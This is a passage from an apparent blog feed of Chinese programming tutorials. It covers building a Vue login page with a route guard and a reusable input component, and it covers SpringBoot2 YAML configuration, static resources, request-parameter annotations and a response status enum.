class="headerlink" title="3.1实现登陆模块"></a>3.1实现登陆模块</h4><ol><li>创建 src&#x2F;views&#x2F;Login.vue, 代码如下所示</li></ol><pre><code class="hljs vue">&lt;template&gt;  &lt;div class=&quot;login&quot;&gt;    Login  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;login&#x27;,  components: &#123;      &#125;&#125;&lt;/script&gt;&lt;style&gt;.login &#123;    width: 100%;    height: 100%;    padding: 30px;    box-sizing: border-box;    background: #fff;    text-align: center;&#125;&lt;/style&gt;language-vue复制代码</code></pre><ol><li>设置当前路由 route.js 和 按需加载</li></ol><pre><code class="hljs vue">&#123;    path: &#x27;/&#x27;,    name: &#x27;Index&#x27;,    // component: Index    component: () =&gt; import(&quot;./views/Index.vue&quot;)  &#125;,  &#123;    path: &#x27;/login&#x27;,    name: &#x27;login&#x27;,    component: () =&gt; import(&quot;./views/Login.vue&quot;) // 按需加载  &#125;language-vue复制代码</code></pre><ol><li>设置路由守卫，route.js</li></ol><pre><code class="hljs vue">// 路由守卫router.beforeEach((to, from, next) =&gt; &#123;  const isLogin = localStorage.ele_login ? true : false;  if (to.path == &#x27;/login&#x27;) &#123;    next();  &#125; else &#123;    // 是否在登陆状态下，如果是就正常跳转，否则返回到 login页面去    isLogin ? next() : next(&quot;/login&quot; )  &#125;&#125;)export default routerlanguage-vue复制代码</code></pre><p>4.导入logo到 assets中，在 login中使用</p><pre><code class="hljs Vue">&lt;template&gt;  &lt;div class=&quot;login&quot;&gt;    &lt;div class=&quot;logo&quot;&gt;        &lt;img src=&quot;../assets/logo.jpeg&quot; alt=&quot;my logo image&quot;&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;style&gt;.login &#123;    width: 100%;    height: 100%;    padding: 30px;    box-sizing: border-box;    background: #fff;&#125;.logo &#123;    text-align: center;&#125;.login img &#123;    width: 150px;&#125;&lt;/style&gt;language-Vue复制代码</code></pre><p>5.input组件封装，创建 components&#x2F;InputGroup.vue</p><pre><code class="hljs vue">&lt;template&gt;  &lt;div class=&quot;text_group&quot;&gt;    &lt;!-- 组件结构 --&gt;    &lt;!-- 组件容器 --&gt;    &lt;div class=&quot;input_group&quot;&gt;        &lt;!-- 输入框， 获取输入框的值 --&gt;        &lt;input           :type=&quot;type&quot;           :name=&quot;name&quot;           :placeholder=&quot;placeholder&quot;           @input=&quot;$emit(&#x27;input&#x27;, $event.target.value)&quot;         &gt;        &lt;!-- 输入框后面的按钮， 绑定一个点击时间--&gt;        &lt;button v-if=&quot;btnTitle&quot; :disabled=&quot;disabled&quot; @click=&quot;$emit(&#x27;btnClick&#x27;)&quot;&gt;&#123;&#123;btnTitle&#125;&#125;&lt;/button&gt;        &lt;!-- 错误提醒, error有值就显示错误信息 --&gt;        &lt;div v-if=&quot;error&quot; class=&quot;invalid-feedback&quot;&gt;&#123;&#123;error&#125;&#125;&lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;inputGroup&#x27;,  props: &#123; // 通过传入参数实现组件复用      type: &#123;          type: String,          default: &quot;text&quot;      &#125;,      value: String,      placeholder: String, // 提示      name: String,      btnTitle: String, // 是否显示获取验证码按钮      disabled: Boolean, // 判断是否可用状态      error: String, // 错误提醒   &#125;,  components: &#123;      &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;.input_group &#123;  border: 1px solid #ccc;  border-radius: 4px;  padding: 10px;  display: flex;  flex-direction: row;  justify-content: space-between;&#125;.input_group input &#123;  height: 100%;  width: 60%;  outline: none;&#125;.input_group button &#123;  border: none;  outline: none;  background: #fff;&#125;.input_group button[disabled] &#123;  color: #aaa;&#125;.is-invalid &#123;  border: 1px solid red;&#125;.invalid-feedback &#123;  color: red;  padding-top: 5px;&#125;&lt;/style&gt;language-vue复制代码</code></pre><ol><li>使用组件，在login.vue 的 script引用组件,在components{}注册组件，创建组件需要的data</li></ol><pre><code class="hljs vue">&lt;template&gt;  &lt;div class=&quot;login&quot;&gt;    &lt;div class=&quot;logo&quot;&gt;        &lt;img src=&quot;../assets/logo.jpeg&quot; alt=&quot;my logo image&quot;&gt;    &lt;/div&gt;    &lt;!-- 手机号 --&gt;    &lt;InputGroup type=&quot;number&quot; v-model=&quot;phone&quot; placeholder=&quot;手机号&quot;    :btnTitle=&quot;btnTitle&quot; :disabled=&quot;disabled&quot; :error=&quot;errors.phone&quot;/&gt;    &lt;!-- 验证码 --&gt;    &lt;InputGroup type=&quot;number&quot; v-model=&quot;verifyCode&quot; placeholder=&quot;验证码&quot;    :error=&quot;errors.code&quot;/&gt;    &lt;!-- 用户服务协议 --&gt;    &lt;div class=&quot;login_des&quot;&gt;      &lt;p&gt;        新用户登陆即自动注册，表示已同意        &lt;span&gt;《用户服务协议》&lt;/span&gt;      &lt;/p&gt;    &lt;/div&gt;    &lt;!-- 登陆按钮 --&gt;    &lt;div class=&quot;login_btn&quot;&gt;      &lt;button&gt;登录&lt;/button&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import InputGroup from &quot;../components/InputGroup&quot;export default &#123;  name: &#x27;login&#x27;,  data() &#123;    return &#123;      phone: &quot;&quot;,      verifyCode: &quot;&quot;,      errors: &#123;&#125;, // 有手机错误或者验证码错误      btnTitle: &quot;获取验证码&quot;,      disabled: false    &#125;  &#125;,  components: &#123;    InputGroup  &#125;&#125;&lt;/script&gt;&lt;style&gt;.login &#123;    width: 100%;    height: 100%;    padding: 30px;    box-sizing: border-box;    background: #fff;&#125;.logo &#123;    text-align: center;&#125;.login img &#123;    width: 150px;&#125;.login_des &#123;  color: #aaa;  line-height: 22px;&#125;.login_des span &#123;  color: #4d90fe;&#125;.login_btn button &#123;  width: 100%;  height: 40px;  background-color: #48ca38;  border-radius: 4px;  color: white;  font-size: 14px;  border: none;  outline: none;&#125;&lt;/style&gt;language-vue复制代码</code></pre><h3 id="4-其他说明"><a href="#4-其他说明" class="headerlink" title="4.其他说明"></a>4.其他说明</h3><h4 id="4-1-调整项目文件的命名和位置"><a href="#4-1-调整项目文件的命名和位置" class="headerlink" title="4.1 调整项目文件的命名和位置"></a>4.1 调整项目文件的命名和位置</h4><ol><li>删除 src&#x2F;components&#x2F;HelloWorld.Vue,</li><li>删除 src&#x2F;views&#x2F;About.vue</li><li>重命名并移动 src&#x2F;store&#x2F;index.js 为 src&#x2F;store.js， 删除 src&#x2F;store;</li><li>重命名并移动 src&#x2F;router&#x2F;index.js 为 src&#x2F;router.js， 删除 src&#x2F;router;</li><li>新建 public&#x2F;css&#x2F;reset.css, 拷贝 reset.css的代码过来，可以上网拷贝。</li><li>修改 src&#x2F;main.js 内容为</li></ol><pre><code class="hljs Vue">import Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import router from &#x27;./router.js&#x27;import store from &#x27;./store.js&#x27;Vue.config.productionTip = falsenew Vue(&#123;  router,  store,  render: h =&gt; h(App)&#125;).$mount(&#x27;#app&#x27;)language-Vue复制代码</code></pre><ol><li>修改 router.js 的内容为</li></ol><pre><code class="hljs Vue">import Vue from &#x27;vue&#x27;import VueRouter from &#x27;vue-router&#x27;import Index from &#x27;./views/Index.vue&#x27;Vue.use(VueRouter)const routes = [  &#123;    path: &#x27;/&#x27;,    name: &#x27;Index&#x27;,    component: Index  &#125;]const router = new VueRouter(&#123;  mode: &#x27;history&#x27;,  base: process.env.BASE_URL,  routes&#125;)export default routerlanguage-Vue复制代码</code></pre><ol><li>src&#x2F;App.vue里面全部内容。</li></ol><pre><code class="hljs Vue">&lt;template&gt;  &lt;div id=&quot;app&quot;&gt;    &lt;router-view/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;App&#x27;,  components: &#123;   &#125;&#125;&lt;/script&gt; &lt;style&gt;#app &#123;  width: 100%;  height: 100%;  font-size: 14px;  background: #f1f1f1;&#125;&lt;/style&gt;language-Vue复制代码</code></pre><ol><li>重命名 src&#x2F;views&#x2F;Home.vue为Index.vue,修改其内容为</li></ol><pre><code class="hljs Vue">&lt;template&gt;  &lt;div class=&quot;index&quot;&gt;    主页  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;Index&#x27;,  components: &#123;    &#125;&#125;&lt;/script&gt;language-Vue复制代码</code></pre><ol><li>在 public&#x2F;index.html 引用 .&#x2F;css&#x2F;reset.css和修改部分内容</li></ol><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./css/reset.css&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><span class="language-css">      <span class="hljs-selector-tag">html</span>,<span class="hljs-selector-tag">body</span> &#123;</span><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span><span class="language-css">      &#125;</span><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>language-html复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot2</title>
      <link href="/2021/06/08/SpringBoot2/"/>
      <url>/2021/06/08/SpringBoot2/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringBoot2核心技术-核心功能"><a href="#SpringBoot2核心技术-核心功能" class="headerlink" title="SpringBoot2核心技术-核心功能"></a>SpringBoot2核心技术-核心功能</h1><h2 id="1、配置文件"><a href="#1、配置文件" class="headerlink" title="1、配置文件"></a>1、配置文件</h2><h3 id="1-1、yaml"><a href="#1-1、yaml" class="headerlink" title="1.1、yaml"></a>1.1、yaml</h3><h4 id="1-1-1、简介"><a href="#1-1-1、简介" class="headerlink" title="1.1.1、简介"></a>1.1.1、简介</h4><p>YAML 是一种采用递归缩进表示层级关系的标记语言，非常适合用来以数据为中心的配置文件.<br>可以使用</p><h4 id="1-1-2、基本语法"><a href="#1-1-2、基本语法" class="headerlink" title="1.1.2、基本语法"></a>1.1.2、基本语法</h4><ul><li>key: value; kv之间有空格</li><li>大小写敏感</li><li>使用缩进表示层次关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li><li>“与”表示字符串内容会被 转义&#x2F;不转义</li></ul><h4 id="1-1-3、数据类型"><a href="#1-1-3、数据类型" class="headerlink" title="1.1.3、数据类型"></a>1.1.3、数据类型</h4><ul><li>字面量：单个的，不可再分的值。date、boolean、string、number、null</li></ul><pre><code class="hljs yaml"><span class="hljs-attr">k:</span> <span class="hljs-string">v</span><span class="hljs-string">language-yaml复制代码</span></code></pre><ul><li>对象：键值对的集合。map、hash、set、object</li></ul><pre><code class="hljs yaml"><span class="hljs-string">行内写法：k:</span> &#123;<span class="hljs-string">k1:v1</span>,<span class="hljs-string">k2:v2</span>,<span class="hljs-string">k3:v3</span>&#125;<span class="hljs-comment">#或</span><span class="hljs-attr">k:</span>  <span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span>  <span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span>  <span class="hljs-attr">k3:</span> <span class="hljs-string">v3</span>  <span class="hljs-attr">K4:</span> <span class="hljs-string">v4</span><span class="hljs-string">language-yaml复制代码</span></code></pre><ul><li>数组：一组按次序排列的值。array、list、queue</li></ul><pre><code class="hljs yaml"><span class="hljs-string">行内写法：k:</span> [<span class="hljs-string">v1</span>,<span class="hljs-string">v2</span>,<span class="hljs-string">v3</span>]<span class="hljs-comment">#或者</span><span class="hljs-attr">k:</span> <span class="hljs-bullet">-</span> <span class="hljs-string">v1</span> <span class="hljs-bullet">-</span> <span class="hljs-string">v2</span> <span class="hljs-bullet">-</span> <span class="hljs-string">v3</span><span class="hljs-string">language-yaml复制代码</span></code></pre><hr><h4 id="1-1-4、示例"><a href="#1-1-4、示例" class="headerlink" title="1.1.4、示例"></a>1.1.4、示例</h4><ul><li>Person.java &amp; Pet.java</li></ul><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;data.person&quot;)</span><span class="hljs-meta">@Component</span><span class="hljs-meta">@ToString</span><span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;        <span class="hljs-keyword">private</span> String userName;    <span class="hljs-keyword">private</span> Boolean boss;    <span class="hljs-keyword">private</span> Date birth;    <span class="hljs-keyword">private</span> Integer age;    <span class="hljs-keyword">private</span> Pet pet;    <span class="hljs-keyword">private</span> String[] interests;    <span class="hljs-keyword">private</span> List&lt;String&gt; animal;    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; score;    <span class="hljs-keyword">private</span> Set&lt;Double&gt; salarys;    <span class="hljs-keyword">private</span> Map&lt;String, List&lt;Pet&gt;&gt; allPets;&#125;<span class="hljs-meta">@ToString</span><span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;    <span class="hljs-keyword">private</span> String name;    <span class="hljs-keyword">private</span> Double weight;&#125;language-java复制代码</code></pre><ul><li>application.yaml</li></ul><pre><code class="hljs yaml"><span class="hljs-attr">data:</span>  <span class="hljs-attr">person:</span>    <span class="hljs-attr">userName:</span> <span class="hljs-string">hjxstart</span>    <span class="hljs-attr">boss:</span> <span class="hljs-literal">true</span>    <span class="hljs-attr">birth:</span> <span class="hljs-number">1998</span><span class="hljs-string">/5/11</span>    <span class="hljs-attr">age:</span> <span class="hljs-number">23</span>    <span class="hljs-attr">interests:</span> [<span class="hljs-string">跑步</span>,<span class="hljs-string">游泳</span>]    <span class="hljs-attr">animal:</span> [<span class="hljs-string">猫</span>,<span class="hljs-string">狗</span>]    <span class="hljs-attr">socre:</span>      <span class="hljs-attr">java:</span> <span class="hljs-number">80</span>      <span class="hljs-attr">mysql:</span> <span class="hljs-number">90</span>      <span class="hljs-attr">linux:</span> <span class="hljs-number">100</span>    <span class="hljs-attr">salarys:</span>      <span class="hljs-bullet">-</span> <span class="hljs-number">9999.98</span>      <span class="hljs-bullet">-</span> <span class="hljs-number">9999.99</span>    <span class="hljs-attr">pet:</span>      <span class="hljs-attr">name:</span> <span class="hljs-string">猫</span>      <span class="hljs-attr">weight:</span> <span class="hljs-number">99.99</span>    <span class="hljs-attr">allPets:</span>      <span class="hljs-attr">sick:</span>        <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">阿狗</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">99.99</span>&#125;        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">阿猫</span>          <span class="hljs-attr">weight:</span> <span class="hljs-number">88.88</span>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">小鱼</span>          <span class="hljs-attr">weight:</span> <span class="hljs-number">77.77</span>      <span class="hljs-attr">health:</span> [&#123;<span class="hljs-attr">name:</span> <span class="hljs-string">阿花</span>, <span class="hljs-attr">weight:</span> <span class="hljs-number">19.99</span>&#125;,&#123;<span class="hljs-attr">name:</span> <span class="hljs-string">阿明</span>, <span class="hljs-attr">weight:</span> <span class="hljs-number">9.99</span>&#125;]<span class="hljs-string">language-yaml复制代码</span></code></pre><hr><h2 id="2、web开发"><a href="#2、web开发" class="headerlink" title="2、web开发"></a>2、web开发</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.3.4.RELEASE/reference/html/spring-boot-features.html#boot-features-developing-web-applications">参考文档</a></p><h3 id="2-1-简单功能分析"><a href="#2-1-简单功能分析" class="headerlink" title="2.1 简单功能分析"></a>2.1 简单功能分析</h3><h4 id="2-1-1、静态资源访问"><a href="#2-1-1、静态资源访问" class="headerlink" title="2.1.1、静态资源访问"></a>2.1.1、静态资源访问</h4><ul><li>默认支持的静态资源的目录<br>&#x2F;static(or &#x2F;public or &#x2F;resources or &#x2F;META-INF&#x2F;resources)</li><li>可以自定义静态资源访问前缀(默认为”&#x2F;**”)和静态资源目录<br><strong>注意</strong>：自定义静态资源访问前缀会导致对欢迎页和Favicon的支持失效</li></ul><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <span class="hljs-attr">mvc:</span>    <span class="hljs-attr">static-path-pattern:</span> <span class="hljs-string">/res/**</span> <span class="hljs-comment">#自定义静态资源访问前缀</span>  <span class="hljs-attr">resources:</span>    <span class="hljs-attr">static-locations:</span> [<span class="hljs-string">classpath:/staticfile</span>] <span class="hljs-comment"># 自定义静态资源目录</span><span class="hljs-string">language-yaml复制代码</span></code></pre><h4 id="2-1-2、欢迎页支持"><a href="#2-1-2、欢迎页支持" class="headerlink" title="2.1.2、欢迎页支持"></a>2.1.2、欢迎页支持</h4><ul><li>把欢迎页(index.html)放在 &#x2F;static or &#x2F;template 目录下即可。</li><li>如果在上面两个文件目录下找不到就处理 &#x2F; 的Controller。</li></ul><h4 id="2-1-3、自定义favicon"><a href="#2-1-3、自定义favicon" class="headerlink" title="2.1.3、自定义favicon"></a>2.1.3、自定义favicon</h4><ul><li>把 favicon 放在静态资源目录下即可，默认放在(&#x2F;static)</li></ul><h4 id="2-1-4、静态资源配置原理"><a href="#2-1-4、静态资源配置原理" class="headerlink" title="2.1.4、静态资源配置原理"></a>2.1.4、静态资源配置原理</h4><ol><li>补充：配置类只有一个有参构造器的情况</li></ol><ul><li>示例</li></ul><pre><code class="hljs java"><span class="hljs-comment">// 有参构造器所有参数的值都会从容器中确定</span><span class="hljs-comment">//ResourceProperties resourceProperties；获取和spring.resources绑定的所有的值的对象</span><span class="hljs-comment">//WebMvcProperties mvcProperties 获取和spring.mvc绑定的所有的值的对象</span><span class="hljs-comment">//ListableBeanFactory beanFactory Spring的beanFactory</span><span class="hljs-comment">//HttpMessageConverters 找到所有的HttpMessageConverters</span><span class="hljs-comment">//ResourceHandlerRegistrationCustomizer 找到 资源处理器的自定义器。=========</span><span class="hljs-comment">//DispatcherServletPath  </span><span class="hljs-comment">//ServletRegistrationBean   给应用注册Servlet、Filter....</span>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WebMvcAutoConfigurationAdapter</span><span class="hljs-params">(ResourceProperties resourceProperties, WebMvcProperties mvcProperties,</span><span class="hljs-params">                ListableBeanFactory beanFactory, ObjectProvider&lt;HttpMessageConverters&gt; messageConvertersProvider,</span><span class="hljs-params">                ObjectProvider&lt;ResourceHandlerRegistrationCustomizer&gt; resourceHandlerRegistrationCustomizerProvider,</span><span class="hljs-params">                ObjectProvider&lt;DispatcherServletPath&gt; dispatcherServletPath,</span><span class="hljs-params">                ObjectProvider&lt;ServletRegistrationBean&lt;?&gt;&gt; servletRegistrations)</span> &#123;            <span class="hljs-built_in">this</span>.resourceProperties = resourceProperties;            <span class="hljs-built_in">this</span>.mvcProperties = mvcProperties;            <span class="hljs-built_in">this</span>.beanFactory = beanFactory;            <span class="hljs-built_in">this</span>.messageConvertersProvider = messageConvertersProvider;            <span class="hljs-built_in">this</span>.resourceHandlerRegistrationCustomizer = resourceHandlerRegistrationCustomizerProvider.getIfAvailable();            <span class="hljs-built_in">this</span>.dispatcherServletPath = dispatcherServletPath;            <span class="hljs-built_in">this</span>.servletRegistrations = servletRegistrations;        &#125;language-java复制代码</code></pre><ol><li>资源处理的默认规则</li><li>欢迎页的处理规则</li><li>faivcon</li></ol><h3 id="2-2-请求参数处理"><a href="#2-2-请求参数处理" class="headerlink" title="2.2 请求参数处理"></a>2.2 请求参数处理</h3><h3 id="2-2-1、请求映射"><a href="#2-2-1、请求映射" class="headerlink" title="2.2.1、请求映射"></a>2.2.1、请求映射</h3><h3 id="2-2-2、普通参数与基本注解"><a href="#2-2-2、普通参数与基本注解" class="headerlink" title="2.2.2、普通参数与基本注解"></a>2.2.2、普通参数与基本注解</h3><ol><li>常用注解<br>@PathVariable, @RequestHeader, @RequestParam, @CookieValue, @ModelAttribute, @MatriVariable, @RequestBody</li></ol><pre><code class="hljs java"><span class="hljs-meta">@PathVariable</span> <span class="hljs-comment">// 获取 url 路径变量(id, username)的值</span><span class="hljs-meta">@RequestHeader</span> <span class="hljs-comment">// 获取请求的Header的值</span><span class="hljs-meta">@RequestParam</span> <span class="hljs-comment">// 获取 url 的参数(age, inters)的值</span><span class="hljs-meta">@CookieValue</span> <span class="hljs-comment">// 获取 Cookie 的值</span><span class="hljs-meta">@ModelAttribute</span> <span class="hljs-comment">// 获取request域属性的值</span>    <span class="hljs-comment">// /car/3/owner/lisi?age=18&amp;inters=basketball&amp;inters=game</span>    <span class="hljs-meta">@GetMapping(&quot;/car/&#123;id&#125;/owner/&#123;username&#125;&quot;)</span>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getCar</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span><span class="hljs-params">                                      <span class="hljs-meta">@PathVariable(&quot;username&quot;)</span> String name, //</span><span class="hljs-params">                                      <span class="hljs-meta">@PathVariable</span> Map&lt;String, String&gt; pv,</span><span class="hljs-params">                                      <span class="hljs-meta">@RequestHeader(&quot;User-Agent&quot;)</span> String userAgent,</span><span class="hljs-params">                                      <span class="hljs-meta">@RequestHeader</span> Map&lt;String, String&gt; rh,</span><span class="hljs-params">                                      <span class="hljs-meta">@RequestParam(&quot;age&quot;)</span> Integer age,</span><span class="hljs-params">                                      <span class="hljs-meta">@RequestParam(&quot;inters&quot;)</span> List&lt;String&gt; inters,</span><span class="hljs-params">                                      <span class="hljs-meta">@RequestParam</span> Map&lt;String,String&gt; rp,</span><span class="hljs-params">                                      <span class="hljs-meta">@CookieValue(&quot;Idea-b83d5636&quot;)</span> String idea,</span><span class="hljs-params">                                      <span class="hljs-meta">@CookieValue(&quot;testcookie&quot;)</span> Cookie cookie)</span> &#123;        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        map.put(<span class="hljs-string">&quot;PV_Id&quot;</span>, id);        map.put(<span class="hljs-string">&quot;PV_Username&quot;</span>, name);        map.put(<span class="hljs-string">&quot;PV_Map&quot;</span>, pv);        map.put(<span class="hljs-string">&quot;RH_UserAgent&quot;</span>, userAgent);        map.put(<span class="hljs-string">&quot;RH_Map&quot;</span>, rh);        map.put(<span class="hljs-string">&quot;RP_age&quot;</span>, age);        map.put(<span class="hljs-string">&quot;RP_inters&quot;</span>, inters);        map.put(<span class="hljs-string">&quot;RP_Map&quot;</span>, rp);        map.put(<span class="hljs-string">&quot;CV_idea&quot;</span>, idea);        map.put(<span class="hljs-string">&quot;Cookie&quot;</span>, cookie);        <span class="hljs-keyword">return</span> map;    &#125;<span class="hljs-comment">// 1.需要开启矩阵变量的配置（在Configuration类中配置）</span>    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> &#123;                <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();                urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>);                configurer.setUrlPathHelper(urlPathHelper);            &#125;        &#125;;    &#125;<span class="hljs-meta">@MatriVariable</span> <span class="hljs-comment">// 2.获取矩阵变量的值。(面试题：禁用cookie后如何传输sessionId)</span>    <span class="hljs-comment">// /boss/1;age=20/2;age=10</span>    <span class="hljs-meta">@GetMapping(&quot;/boss/&#123;bossId&#125;/&#123;empId&#125;&quot;)</span>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">boss</span><span class="hljs-params">(<span class="hljs-meta">@MatrixVariable(value = &quot;age&quot;, pathVar = &quot;bossId&quot;)</span> Integer bossAge,</span><span class="hljs-params">                    <span class="hljs-meta">@MatrixVariable(value = &quot;age&quot;, pathVar = &quot;empId&quot;)</span> Integer empAge)</span> &#123;        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        map.put(<span class="hljs-string">&quot;bossAge&quot;</span>, bossAge);        map.put(<span class="hljs-string">&quot;empAge&quot;</span>, empAge);        <span class="hljs-keyword">return</span> map;    &#125;<span class="hljs-meta">@RequestBody</span> <span class="hljs-comment">// 获取请求体（只有POST请求才有）的值</span>    <span class="hljs-meta">@PostMapping(&quot;/save&quot;)</span>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">postMethod</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String content)</span> &#123;        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        map.put(<span class="hljs-string">&quot;RequestBody&quot;</span>, content);        <span class="hljs-keyword">return</span> map;    &#125;language-java复制代码</code></pre><ul><li>原理：</li></ul><ol><li>Servlet API:<br>WebRequest, ServletRequest, MultipartRequest, HttpSession、javax.servlet.http.PushBuilder, Principal, InputStream, Reader, HttpMethod, Locale, TimeZone, Zoneld</li></ol><ul><li>ServletRequestMethodArgumentResolver 可以处理以上的部分参数</li></ul><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;Class&lt;?&gt; paramType = parameter.getParameterType();<span class="hljs-keyword">return</span> (WebRequest.class.isAssignableFrom(paramType) ||ServletRequest.class.isAssignableFrom(paramType) ||MultipartRequest.class.isAssignableFrom(paramType) ||HttpSession.class.isAssignableFrom(paramType) ||(pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; pushBuilder.isAssignableFrom(paramType)) ||Principal.class.isAssignableFrom(paramType) ||InputStream.class.isAssignableFrom(paramType) ||Reader.class.isAssignableFrom(paramType) ||HttpMethod.class == paramType ||Locale.class == paramType ||TimeZone.class == paramType ||ZoneId.class == paramType);&#125;language-java复制代码</code></pre><ol><li>复杂参数<br><strong>Map</strong>, <strong>Model</strong>, Errors&#x2F;BindingResult, <strong>RedirectAttributes</strong>, <strong>ServletResponse</strong>, SessionStatus, UriComponentsBuilder, ServletUriComponentsBuilder</li></ol><ul><li>map, model里面的数据会被放在 request 的请求域 request.setAttribute</li><li>RedirectAttributes 是重定向携带数据</li><li>ServletResponse 拿到原生的Response能干什么</li></ul><ol><li>自定义对象参数<br>可以自动类型与格式化，可以级联封装。</li></ol><hr><h2 id="3、数据访问"><a href="#3、数据访问" class="headerlink" title="3、数据访问"></a>3、数据访问</h2><hr><h2 id="4、单元测试"><a href="#4、单元测试" class="headerlink" title="4、单元测试"></a>4、单元测试</h2><hr><h2 id="5、指标监控"><a href="#5、指标监控" class="headerlink" title="5、指标监控"></a>5、指标监控</h2><hr><h2 id="6、原来解析"><a href="#6、原来解析" class="headerlink" title="6、原来解析"></a>6、原来解析</h2><hr><h1 id="SpringBoot统一返回信息格式"><a href="#SpringBoot统一返回信息格式" class="headerlink" title="SpringBoot统一返回信息格式"></a>SpringBoot统一返回信息格式</h1><h2 id="1-创建枚举类"><a href="#1-创建枚举类" class="headerlink" title="1. 创建枚举类"></a>1. 创建枚举类</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo2.v1.dto;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> jxh</span><span class="hljs-comment"> * 状态码和描述信息</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">RHttpStatusEnum</span> &#123;    <span class="hljs-comment">/*** 通用部分 100 - 599***/</span>    <span class="hljs-comment">// 成功</span>    SUCCESS(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;success&quot;</span>),    <span class="hljs-comment">// 重定向</span>    REDIRECT(<span class="hljs-number">301</span>, <span class="hljs-string">&quot;redirect&quot;</span>),    <span class="hljs-comment">// 资源未找到</span>    NOT_FOUND(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;not found&quot;</span>),    <span class="hljs-comment">// 服务器错误</span>    SERVER_ERROR(<span class="hljs-number">500</span>,<span class="hljs-string">&quot;server error&quot;</span>),    <span class="hljs-comment">// 服务器忙</span>    SERVER_BUSY(<span class="hljs-number">503</span>,<span class="hljs-string">&quot;服务器正忙，请稍后再试!&quot;</span>),    <span class="hljs-comment">/*** 这里可以根据不同模块用不同的区级分开错误码，例如:  ***/</span>    <span class="hljs-comment">// 1000～1999 区间表示周报模块错误</span>    DIARIES_ERROR(<span class="hljs-number">1999</span>, <span class="hljs-string">&quot;未知错误，请联系管理员&quot;</span>);    <span class="hljs-comment">// 2000～2999 区间表示任务模块错误</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> code;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String msg;    RHttpStatusEnum(Integer code, String message) &#123;        <span class="hljs-built_in">this</span>.code = code;        <span class="hljs-built_in">this</span>.msg = message;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span 